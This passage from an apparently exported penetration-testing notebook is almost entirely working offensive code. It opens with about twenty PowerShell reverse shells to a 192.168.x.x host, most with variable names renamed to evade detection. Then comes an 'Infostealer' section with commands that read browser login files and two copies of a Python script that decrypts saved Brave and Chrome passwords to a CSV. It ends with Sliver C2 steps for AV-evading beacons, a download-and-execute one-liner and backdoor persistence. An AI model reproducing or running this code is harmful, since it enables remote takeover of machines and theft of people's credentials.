&#39;;$EncodedPrompt=([text.encoding]::ASCII).GetBytes($Prompt);$Stream.Write($EncodedPrompt,0,$EncodedPrompt.Length);$Stream.Flush()};$Client.Close()</p><p>=</p><p>$ip=&#39;192.168.255.132&#39;;$port=443;$client=New-Object Net.Sockets.TcpClient($ip,$port);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($readBytes=$stream.Read($buffer,0,$buffer.Length))){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$readBytes);$output=(iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String);$prompt=$output+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$encodedPrompt=([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($encodedPrompt,0,$encodedPrompt.Length);$stream.Flush()};$client.Close()</p><p>=</p><p>${n3b}=&#39;192.168.255.132&#39;;${pDv}=443;${UqC}=[System.Net.Sockets.TcpClient]::new(${n3b},${pDv});${sUf}=${UqC}.GetStream();[byte[]]${N2L}=0..65535|%{0};while((${jIx}=${sUf}.Read(${N2L},0,${N2L}.Length))){${EVe}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${N2L},0,${jIx});${x1Z}=(iex &quot;. { ${EVe} } 2&gt;&amp;1&quot; | Out-String );${Jmc}=${x1Z}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${kPx}=([text.encoding]::ASCII).GetBytes(${Jmc});${sUf}.Write(${kPx},0,${kPx}.Length);${sUf}.Flush()};${UqC}.Close()</p><p>=</p><p>${cFg}=&#39;192.168.255.132&#39;;${dJh}=443;${zKl}=[System.Net.Sockets.TcpClient]::new(${cFg},${dJh});${tNn}=${zKl}.GetStream();[byte[]]${uOp}=0..65535|%{0};while((${vQr}=${tNn}.Read(${uOp},0,${uOp}.Length))){${wXs}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${uOp},0,${vQr});${yZt}=(iex &quot;. { ${wXs} } 2&gt;&amp;1&quot; | Out-String );${aBc}=${yZt}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${eFg}=([text.encoding]::ASCII).GetBytes(${aBc});${tNn}.Write(${eFg},0,${eFg}.Length);${tNn}.Flush()};${zKl}.Close()</p><p>=</p><p>${Gxw}=&#39;192.168.255.132&#39;;${Hyj}=443;${Svk}=[System.Net.Sockets.TcpClient]::new(${Gxw},${Hyj});${Dnt}=${Svk}.GetStream();[byte[]]${Qzm}=0..65535|%{0};while((${Ecu}=${Dnt}.Read(${Qzm},0,${Qzm}.Length))){${Frv}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Qzm},0,${Ecu});${Lqg}=(iex &quot;. { ${Frv} } 2&gt;&amp;1&quot; | Out-String );${Mrh}=${Lqg}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Oni}=([text.encoding]::ASCII).GetBytes(${Mrh});${Dnt}.Write(${Oni},0,${Oni}.Length);${Dnt}.Flush()};${Svk}.Close()</p><p></p><p>=</p><p>$ip=&#39;192.168.255.132&#39;;$port=443;$client=New-Object Net.Sockets.TcpClient($ip,$port);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($readBytes=$stream.Read($buffer,0,$buffer.Length))){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$readBytes);$output=(iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String);$prompt=$output+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$encodedPrompt=([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($encodedPrompt,0,$encodedPrompt.Length);$stream.Flush()};$client.Close()</p><p>=</p><p>${n3b}=&#39;192.168.255.132&#39;;${pDv}=443;${UqC}=[System.Net.Sockets.TcpClient]::new(${n3b},${pDv});${sUf}=${UqC}.GetStream();[byte[]]${N2L}=0..65535|%{0};while((${jIx}=${sUf}.Read(${N2L},0,${N2L}.Length))){${EVe}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${N2L},0,${jIx});${x1Z}=(iex &quot;. { ${EVe} } 2&gt;&amp;1&quot; | Out-String );${Jmc}=${x1Z}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${kPx}=([text.encoding]::ASCII).GetBytes(${Jmc});${sUf}.Write(${kPx},0,${kPx}.Length);${sUf}.Flush()};${UqC}.Close()</p><p>=</p><p>${cFg}=&#39;192.168.255.132&#39;;${dJh}=443;${zKl}=[System.Net.Sockets.TcpClient]::new(${cFg},${dJh});${tNn}=${zKl}.GetStream();[byte[]]${uOp}=0..65535|%{0};while((${vQr}=${tNn}.Read(${uOp},0,${uOp}.Length))){${wXs}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${uOp},0,${vQr});${yZt}=(iex &quot;. { ${wXs} } 2&gt;&amp;1&quot; | Out-String );${aBc}=${yZt}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${eFg}=([text.encoding]::ASCII).GetBytes(${aBc});${tNn}.Write(${eFg},0,${eFg}.Length);${tNn}.Flush()};${zKl}.Close()</p><p>=</p><p>${Gxw}=&#39;192.168.255.132&#39;;${Hyj}=443;${Svk}=[System.Net.Sockets.TcpClient]::new(${Gxw},${Hyj});${Dnt}=${Svk}.GetStream();[byte[]]${Qzm}=0..65535|%{0};while((${Ecu}=${Dnt}.Read(${Qzm},0,${Qzm}.Length))){${Frv}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Qzm},0,${Ecu});${Lqg}=(iex &quot;. { ${Frv} } 2&gt;&amp;1&quot; | Out-String );${Mrh}=${Lqg}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Oni}=([text.encoding]::ASCII).GetBytes(${Mrh});${Dnt}.Write(${Oni},0,${Oni}.Length);${Dnt}.Flush()};${Svk}.Close()</p><p>=</p><p>${Tjh}=&#39;192.168.255.132&#39;;${Urs}=443;${Ntd}=[System.Net.Sockets.TcpClient]::new(${Tjh},${Urs});${Suv}=${Ntd}.GetStream();[byte[]]${Ovw}=0..65535|%{0};while((${Pwx}=${Suv}.Read(${Ovw},0,${Ovw}.Length))){${Qyx}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Ovw},0,${Pwx});${Rzt}=(iex &quot;. { ${Qyx} } 2&gt;&amp;1&quot; | Out-String );${Ucw}=${Rzt}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Vbd}=([text.encoding]::ASCII).GetBytes(${Ucw});${Suv}.Write(${Vbd},0,${Vbd}.Length);${Suv}.Flush()};${Ntd}.Close()</p><p>=</p><p>${Fgh}=&#39;192.168.255.132&#39;;${Ijk}=443;${Wqv}=[System.Net.Sockets.TcpClient]::new(${Fgh},${Ijk});${Xru}=${Wqv}.GetStream();[byte[]]${Yzs}=0..65535|%{0};while((${Zat}=${Xru}.Read(${Yzs},0,${Yzs}.Length))){${Abu}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Yzs},0,${Zat});${Bcv}=(iex &quot;. { ${Abu} } 2&gt;&amp;1&quot; | Out-String );${Cdw}=${Bcv}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Dex}=([text.encoding]::ASCII).GetBytes(${Cdw});${Xru}.Write(${Dex},0,${Dex}.Length);${Xru}.Flush()};${Wqv}.Close()</p><p>=</p><p>${Lmn}=&#39;192.168.255.132&#39;;${Opq}=443;${Xyz}=[System.Net.Sockets.TcpClient]::new(${Lmn},${Opq});${Abc}=${Xyz}.GetStream();[byte[]]${Def}=0..65535|%{0};while((${Ghi}=${Abc}.Read(${Def},0,${Def}.Length))){${Jkl}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Def},0,${Ghi});${Mno}=(iex &quot;. { ${Jkl} } 2&gt;&amp;1&quot; | Out-String );${Pqr}=${Mno}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Stu}=([text.encoding]::ASCII).GetBytes(${Pqr});${Abc}.Write(${Stu},0,${Stu}.Length);${Abc}.Flush()};${Xyz}.Close()</p><p>=</p><p>${Vwx}=&#39;192.168.255.132&#39;;${Yz1}=443;${Z12}=[System.Net.Sockets.TcpClient]::new(${Vwx},${Yz1});${345}=${Z12}.GetStream();[byte[]]${678}=0..65535|%{0};while((${90a}=${345}.Read(${678},0,${678}.Length))){${Bcd}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${678},0,${90a});${Def}=(iex &quot;. { ${Bcd} } 2&gt;&amp;1&quot; | Out-String );${Ghi}=${Def}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Jkl}=([text.encoding]::ASCII).GetBytes(${Ghi});${345}.Write(${Jkl},0,${Jkl}.Length);${345}.Flush()};${Z12}.Close()</p><p>=</p><p>${Mno}=&#39;192.168.255.132&#39;;${Pqr}=443;${Stu}=[System.Net.Sockets.TcpClient]::new(${Mno},${Pqr});${Vwx}=${Stu}.GetStream();[byte[]]${Yz1}=0..65535|%{0};while((${Z12}=${Vwx}.Read(${Yz1},0,${Yz1}.Length))){${345}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${Yz1},0,${Z12});${678}=(iex &quot;. { ${345} } 2&gt;&amp;1&quot; | Out-String );${90a}=${678}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${Bcd}=([text.encoding]::ASCII).GetBytes(${90a});${Vwx}.Write(${Bcd},0,${Bcd}.Length);${Vwx}.Flush()};${Stu}.Close()</p><p>=</p><p>${ip}=&#39;192.168.255.132&#39;;${port}=443;${client}=New-Object Net.Sockets.TcpClient(${ip},${port});${stream}=${client}.GetStream();[byte[]]${buffer}=0..65535|%{0};while((${readBytes}=${stream}.Read(${buffer},0,${buffer}.Length))){${data}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${buffer},0,${readBytes});${output}=(iex &quot;. { ${data} } 2&gt;&amp;1&quot; | Out-String);${prompt}=${output}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${encodedPrompt}=([text.encoding]::ASCII).GetBytes(${prompt});${stream}.Write(${encodedPrompt},0,${encodedPrompt}.Length);${stream}.Flush()};${client}.Close()</p><p>=</p><p>${a1}=&#39;192.168.255.132&#39;;${b2}=443;${c3}=New-Object Net.Sockets.TcpClient(${a1},${b2});${d4}=${c3}.GetStream();[byte[]]${e5}=0..65535|%{0};while((${f6}=${d4}.Read(${e5},0,${e5}.Length))){${g7}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${e5},0,${f6});${h8}=(iex &quot;. { ${g7} } 2&gt;&amp;1&quot; | Out-String );${i9}=${h8}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${j10}=([text.encoding]::ASCII).GetBytes(${i9});${d4}.Write(${j10},0,${j10}.Length);${d4}.Flush()};${c3}.Close()</p><p>=</p><p>${k11}=&#39;192.168.255.132&#39;;${l12}=443;${m13}=New-Object Net.Sockets.TcpClient(${k11},${l12});${n14}=${m13}.GetStream();[byte[]]${o15}=0..65535|%{0};while((${p16}=${n14}.Read(${o15},0,${o15}.Length))){${q17}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${o15},0,${p16});${r18}=(iex &quot;. { ${q17} } 2&gt;&amp;1&quot; | Out-String );${s19}=${r18}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${t20}=([text.encoding]::ASCII).GetBytes(${s19});${n14}.Write(${t20},0,${t20}.Length);${n14}.Flush()};${m13}.Close()</p><p>=</p><p>${u21}=&#39;192.168.255.132&#39;;${v22}=443;${w23}=New-Object Net.Sockets.TcpClient(${u21},${v22});${x24}=${w23}.GetStream();[byte[]]${y25}=0..65535|%{0};while((${z26}=${x24}.Read(${y25},0,${y25}.Length))){${a27}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${y25},0,${z26});${b28}=(iex &quot;. { ${a27} } 2&gt;&amp;1&quot; | Out-String );${c29}=${b28}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${d30}=([text.encoding]::ASCII).GetBytes(${c29});${x24}.Write(${d30},0,${d30}.Length);${x24}.Flush()};${w23}.Close()</p><p>=</p><p>${e31}=&#39;192.168.255.132&#39;;${f32}=443;${g33}=New-Object Net.Sockets.TcpClient(${e31},${f32});${h34}=${g33}.GetStream();[byte[]]${i35}=0..65535|%{0};while((${j36}=${h34}.Read(${i35},0,${i35}.Length))){${k37}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${i35},0,${j36});${l38}=(iex &quot;. { ${k37} } 2&gt;&amp;1&quot; | Out-String );${m39}=${l38}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${n40}=([text.encoding]::ASCII).GetBytes(${m39});${h34}.Write(${n40},0,${n40}.Length);${h34}.Flush()};${g33}.Close()</p><p>=</p><p>${o41}=&#39;192.168.255.132&#39;;${p42}=443;${q43}=New-Object Net.Sockets.TcpClient(${o41},${p42});${r44}=${q43}.GetStream();[byte[]]${s45}=0..65535|%{0};while((${t46}=${r44}.Read(${s45},0,${s45}.Length))){${u47}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${s45},0,${t46});${v48}=(iex &quot;. { ${u47} } 2&gt;&amp;1&quot; | Out-String );${w49}=${v48}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${x50}=([text.encoding]::ASCII).GetBytes(${w49});${r44}.Write(${x50},0,${x50}.Length);${r44}.Flush()};${q43}.Close()</p><p>=</p><p>${y51}=&#39;192.168.255.132&#39;;${z52}=443;${a53}=New-Object Net.Sockets.TcpClient(${y51},${z52});${b54}=${a53}.GetStream();[byte[]]${c55}=0..65535|%{0};while((${d56}=${b54}.Read(${c55},0,${c55}.Length))){${e57}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${c55},0,${d56});${f58}=(iex &quot;. { ${e57} } 2&gt;&amp;1&quot; | Out-String );${g59}=${f58}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${h60}=([text.encoding]::ASCII).GetBytes(${g59});${b54}.Write(${h60},0,${h60}.Length);${b54}.Flush()};${a53}.Close()</p><p>=</p><p>${i61}=&#39;192.168.255.132&#39;;${j62}=443;${k63}=New-Object Net.Sockets.TcpClient(${i61},${j62});${l64}=${k63}.GetStream();[byte[]]${m65}=0..65535|%{0};while((${n66}=${l64}.Read(${m65},0,${m65}.Length))){${o67}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${m65},0,${n66});${p68}=(iex &quot;. { ${o67} } 2&gt;&amp;1&quot; | Out-String );${q69}=${p68}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${r70}=([text.encoding]::ASCII).GetBytes(${q69});${l64}.Write(${r70},0,${r70}.Length);${l64}.Flush()};${k63}.Close()</p><p>=</p><p>${s71}=&#39;192.168.97.202&#39;;${t72}=443;${u73}=New-Object Net.Sockets.TcpClient(${s71},${t72});${v74}=${u73}.GetStream();[byte[]]${w75}=0..65535|%{0};while((${x76}=${v74}.Read(${w75},0,${w75}.Length))){${y77}=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(${w75},0,${x76});${z78}=(iex &quot;. { ${y77} } 2&gt;&amp;1&quot; | Out-String );${a79}=${z78}+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;${b80}=([text.encoding]::ASCII).GetBytes(${a79});${v74}.Write(${b80},0,${b80}.Length);${v74}.Flush()};${u73}.Close()</p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--Infostealer_941.html"></a><h1 class='title level-5'>Infostealer</h1><br/><p>collection of various malware with infostealing capabilities</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--Infostealer--decrypt_brave_passwords_942.html"></a><h1 class='title level-6'>decrypt brave passwords</h1><br/><p>Locations:</p><p></p><p>sessions:</p><p>type &quot;C:\Users\Christopher\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Sessions\*&quot; | find /i &quot;paypal&quot;</p><p></p><p></p><p>For me:</p><p>type &quot;C:\Users\Christopher\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\login data&quot;</p><p>type &quot;C:\Users\Christopher\AppData\Local\Google\Chrome\User Data\Default\login data&quot;</p><p>type &quot;C:\Users\Christopher\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json&quot;</p><p></p><p>In powershell:</p><p>type &quot;$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\login data&quot;</p><p>type &quot;$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\login data&quot;</p><p>type &quot;$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json&quot;</p><p></p><p><a href="https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py">https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py</a></p><p>dependencies:</p><p>python install obv</p><p>pip install pypiwin32</p><p>pip install pycryptodomex</p><p>===================</p><p></p><p>import os</p><p>import re</p><p>import sys</p><p>import json</p><p>import base64</p><p>import sqlite3</p><p>import win32crypt</p><p>from Cryptodome.Cipher import AES</p><p>import shutil</p><p>import csv</p><p></p><p>#GLOBAL CONSTANT</p><p>CHROME_PATH_LOCAL_STATE = os.path.normpath(r&quot;%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State&quot;%(os.environ[&#39;USERPROFILE&#39;]))</p><p>CHROME_PATH = os.path.normpath(r&quot;%s\AppData\Local\BraveSoftware\Brave-Browser\User Data&quot;%(os.environ[&#39;USERPROFILE&#39;]))</p><p></p><p>def get_secret_key():</p><p>    try:</p><p>        #(1) Get secretkey from chrome local state</p><p>        with open( CHROME_PATH_LOCAL_STATE, &quot;r&quot;, encoding=&#39;utf-8&#39;) as f:</p><p>            local_state = f.read()</p><p>            local_state = json.loads(local_state)</p><p>        secret_key = base64.b64decode(local_state[&quot;os_crypt&quot;][&quot;encrypted_key&quot;])</p><p>        #Remove suffix DPAPI</p><p>        secret_key = secret_key[5:] </p><p>        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]</p><p>        return secret_key</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Chrome secretkey cannot be found&quot;)</p><p>        return None</p><p>    </p><p>def decrypt_payload(cipher, payload):</p><p>    return cipher.decrypt(payload)</p><p></p><p>def generate_cipher(aes_key, iv):</p><p>    return AES.new(aes_key, AES.MODE_GCM, iv)</p><p></p><p>def decrypt_password(ciphertext, secret_key):</p><p>    try:</p><p>        #(3-a) Initialisation vector for AES decryption</p><p>        initialisation_vector = ciphertext[3:15]</p><p>        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)</p><p>        #Encrypted password is 192 bits</p><p>        encrypted_password = ciphertext[15:-16]</p><p>        #(4) Build the cipher to decrypt the ciphertext</p><p>        cipher = generate_cipher(secret_key, initialisation_vector)</p><p>        decrypted_pass = decrypt_payload(cipher, encrypted_password)</p><p>        decrypted_pass = decrypted_pass.decode()  </p><p>        return decrypted_pass</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.&quot;)</p><p>        return &quot;&quot;</p><p>    </p><p>def get_db_connection(chrome_path_login_db):</p><p>    try:</p><p>        print(chrome_path_login_db)</p><p>        shutil.copy2(chrome_path_login_db, &quot;Loginvault.db&quot;) </p><p>        return sqlite3.connect(&quot;Loginvault.db&quot;)</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Chrome database cannot be found&quot;)</p><p>        return None</p><p>        </p><p>if __name__ == &#39;__main__&#39;:</p><p>    try:</p><p>        #Create Dataframe to store passwords</p><p>        with open(&#39;decrypted_password.csv&#39;, mode=&#39;w&#39;, newline=&#39;&#39;, encoding=&#39;utf-8&#39;) as decrypt_password_file:</p><p>            csv_writer = csv.writer(decrypt_password_file, delimiter=&#39;,&#39;)</p><p>            csv_writer.writerow([&quot;index&quot;,&quot;url&quot;,&quot;username&quot;,&quot;password&quot;])</p><p>            #(1) Get secret key</p><p>            secret_key = get_secret_key()</p><p>            #Search user profile or default folder (this is where the encrypted login password is stored)</p><p>            folders = [element for element in os.listdir(CHROME_PATH) if re.search(&quot;^Profile*|^Default$&quot;,element)!=None]</p><p>            for folder in folders:</p><p>            	#(2) Get ciphertext from sqlite database</p><p>                chrome_path_login_db = os.path.normpath(r&quot;%s\%s\Login Data&quot;%(CHROME_PATH,folder))</p><p>                conn = get_db_connection(chrome_path_login_db)</p><p>                if(secret_key and conn):</p><p>                    cursor = conn.cursor()</p><p>                    cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins&quot;)</p><p>                    for index,login in enumerate(cursor.fetchall()):</p><p>                        url = login[0]</p><p>                        username = login[1]</p><p>                        ciphertext = login[2]</p><p>                        if(url!=&quot;&quot; and username!=&quot;&quot; and ciphertext!=&quot;&quot;):</p><p>                            #(3) Filter the initialisation vector &amp; encrypted password from ciphertext </p><p>                            #(4) Use AES algorithm to decrypt the password</p><p>                            decrypted_password = decrypt_password(ciphertext, secret_key)</p><p>                            print(&quot;Sequence: %d&quot;%(index))</p><p>                            print(&quot;URL: %s\nUser Name: %s\nPassword: %s\n&quot;%(url,username,decrypted_password))</p><p>                            print(&quot;*&quot;*50)</p><p>                            #(5) Save into CSV </p><p>                            csv_writer.writerow([index,url,username,decrypted_password])</p><p>                    #Close database connection</p><p>                    cursor.close()</p><p>                    conn.close()</p><p>                    #Delete temp login db</p><p>                    os.remove(&quot;Loginvault.db&quot;)</p><p>    except Exception as e:</p><p>        print(&quot;[ERR] %s&quot;%str(e))</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--Infostealer--decrypt_brave_passwords--decrypt_chrome_passwords_944.html"></a><h1 class='title level-7'>decrypt chrome passwords</h1><br/><p><a href="https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py">https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py</a></p><p>dependencies:</p><p>python install obv</p><p>pip install pypiwin32</p><p>pip install pycryptodomex</p><p></p><p></p><p>===================</p><p></p><p></p><p>import os</p><p>import re</p><p>import sys</p><p>import json</p><p>import base64</p><p>import sqlite3</p><p>import win32crypt</p><p>from Cryptodome.Cipher import AES</p><p>import shutil</p><p>import csv</p><p></p><p>#GLOBAL CONSTANT</p><p>CHROME_PATH_LOCAL_STATE = os.path.normpath(r&quot;%s\AppData\Local\Google\Chrome\User Data\Local State&quot;%(os.environ[&#39;USERPROFILE&#39;]))</p><p>CHROME_PATH = os.path.normpath(r&quot;%s\AppData\Local\Google\Chrome\User Data&quot;%(os.environ[&#39;USERPROFILE&#39;]))</p><p></p><p>def get_secret_key():</p><p>    try:</p><p>        #(1) Get secretkey from chrome local state</p><p>        with open( CHROME_PATH_LOCAL_STATE, &quot;r&quot;, encoding=&#39;utf-8&#39;) as f:</p><p>            local_state = f.read()</p><p>            local_state = json.loads(local_state)</p><p>        secret_key = base64.b64decode(local_state[&quot;os_crypt&quot;][&quot;encrypted_key&quot;])</p><p>        #Remove suffix DPAPI</p><p>        secret_key = secret_key[5:] </p><p>        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]</p><p>        return secret_key</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Chrome secretkey cannot be found&quot;)</p><p>        return None</p><p>    </p><p>def decrypt_payload(cipher, payload):</p><p>    return cipher.decrypt(payload)</p><p></p><p>def generate_cipher(aes_key, iv):</p><p>    return AES.new(aes_key, AES.MODE_GCM, iv)</p><p></p><p>def decrypt_password(ciphertext, secret_key):</p><p>    try:</p><p>        #(3-a) Initialisation vector for AES decryption</p><p>        initialisation_vector = ciphertext[3:15]</p><p>        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)</p><p>        #Encrypted password is 192 bits</p><p>        encrypted_password = ciphertext[15:-16]</p><p>        #(4) Build the cipher to decrypt the ciphertext</p><p>        cipher = generate_cipher(secret_key, initialisation_vector)</p><p>        decrypted_pass = decrypt_payload(cipher, encrypted_password)</p><p>        decrypted_pass = decrypted_pass.decode()  </p><p>        return decrypted_pass</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.&quot;)</p><p>        return &quot;&quot;</p><p>    </p><p>def get_db_connection(chrome_path_login_db):</p><p>    try:</p><p>        print(chrome_path_login_db)</p><p>        shutil.copy2(chrome_path_login_db, &quot;Loginvault.db&quot;) </p><p>        return sqlite3.connect(&quot;Loginvault.db&quot;)</p><p>    except Exception as e:</p><p>        print(&quot;%s&quot;%str(e))</p><p>        print(&quot;[ERR] Chrome database cannot be found&quot;)</p><p>        return None</p><p>        </p><p>if __name__ == &#39;__main__&#39;:</p><p>    try:</p><p>        #Create Dataframe to store passwords</p><p>        with open(&#39;decrypted_password.csv&#39;, mode=&#39;w&#39;, newline=&#39;&#39;, encoding=&#39;utf-8&#39;) as decrypt_password_file:</p><p>            csv_writer = csv.writer(decrypt_password_file, delimiter=&#39;,&#39;)</p><p>            csv_writer.writerow([&quot;index&quot;,&quot;url&quot;,&quot;username&quot;,&quot;password&quot;])</p><p>            #(1) Get secret key</p><p>            secret_key = get_secret_key()</p><p>            #Search user profile or default folder (this is where the encrypted login password is stored)</p><p>            folders = [element for element in os.listdir(CHROME_PATH) if re.search(&quot;^Profile*|^Default$&quot;,element)!=None]</p><p>            for folder in folders:</p><p>            	#(2) Get ciphertext from sqlite database</p><p>                chrome_path_login_db = os.path.normpath(r&quot;%s\%s\Login Data&quot;%(CHROME_PATH,folder))</p><p>                conn = get_db_connection(chrome_path_login_db)</p><p>                if(secret_key and conn):</p><p>                    cursor = conn.cursor()</p><p>                    cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins&quot;)</p><p>                    for index,login in enumerate(cursor.fetchall()):</p><p>                        url = login[0]</p><p>                        username = login[1]</p><p>                        ciphertext = login[2]</p><p>                        if(url!=&quot;&quot; and username!=&quot;&quot; and ciphertext!=&quot;&quot;):</p><p>                            #(3) Filter the initialisation vector &amp; encrypted password from ciphertext </p><p>                            #(4) Use AES algorithm to decrypt the password</p><p>                            decrypted_password = decrypt_password(ciphertext, secret_key)</p><p>                            print(&quot;Sequence: %d&quot;%(index))</p><p>                            print(&quot;URL: %s\nUser Name: %s\nPassword: %s\n&quot;%(url,username,decrypted_password))</p><p>                            print(&quot;*&quot;*50)</p><p>                            #(5) Save into CSV </p><p>                            csv_writer.writerow([index,url,username,decrypted_password])</p><p>                    #Close database connection</p><p>                    cursor.close()</p><p>                    conn.close()</p><p>                    #Delete temp login db</p><p>                    os.remove(&quot;Loginvault.db&quot;)</p><p>    except Exception as e:</p><p>        print(&quot;[ERR] %s&quot;%str(e))</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--Infostealer--decrypt_firefox_passwords_943.html"></a><h1 class='title level-6'>decrypt firefox passwords</h1><br/><p><a href="https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py">https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py</a></p><p></p><p>just run it, works out of the box</p></div><div class='page'><a name="Methdology--C2__Command_and_Control_395.html"></a><h1 class='title level-2'>C2 | Command and Control</h1><br/></div><div class='page'><a name="Methdology--C2__Command_and_Control--Sliver_596.html"></a><h1 class='title level-3'>Sliver</h1><br/><p><a href="https://www.youtube.com/watch?app=desktop&v=FYWGhdaDcZo">https://www.youtube.com/watch?app=desktop&amp;v=FYWGhdaDcZo</a></p><p></p><p><a href="https://www.youtube.com/watch?v=eZOeF-3qMtg">https://www.youtube.com/watch?v=eZOeF-3qMtg</a></p><p><a href="https://www.youtube.com/watch?v=eotEvAZw5Lc&list=PL0UJtYdHHM46sIZbkieIe6BhKzfu4QOI9&index=4">https://www.youtube.com/watch?v=eotEvAZw5Lc&amp;list=PL0UJtYdHHM46sIZbkieIe6BhKzfu4QOI9&amp;index=4</a></p><p><h3>Setup:</h3></p><p>./sliver-server</p><p>new-operator --name arcos --lhost localhost</p><p>multiplayer</p><p>armory install all</p><p></p><p><h3>Payload beacon, bypasses AV:</h3></p><p>generate beacon --os windows --arch amd64 -m 192.168.1.42:53 -f shellcode -s /tmp/uwu.bin --skip-symbols -S 5</p><p></p><p>msfvenom -p generic/custom payloadfile=/tmp/uwu.bin -a x64 -f psh -o /tmp/uwu.ps1</p><p>iex (iwr -usebasicparsing <a href="http://192.168.1.42/uwu.ps1">http://192.168.1.42/uwu.ps1</a><a href="http://192.168.1.42:81/uwu.ps1)">)</a></p><p></p><p><h3>Assemly in process execution:</h3></p><p>execute-assembly -i -E /opt/tools/windows_privesc/Rubeus.exe klist</p><p></p><p></p><p><h3>Listeners, status, and navigation:</h3></p><p>mtls -l 53</p><p>https -l 443</p><p>jobs</p><p>beacons</p><p>shell</p><p></p><p>beacons rm</p><p>session -K</p><p></p><p><h3>Persistance (incomplete):</h3></p><p>profiles new --format shellcode --mtls 192.168.1.42:53 profile1</p><p>backdoor --profile profile1 &quot;c:\windows\system32\calc.exe&quot;</p><p></p><p></p></div><div class='page'><a name="Methdology--C2__Command_and_Control--Metasploit_396.html"></a><h1 class='title level-3'>Metasploit</h1><br/><p><a 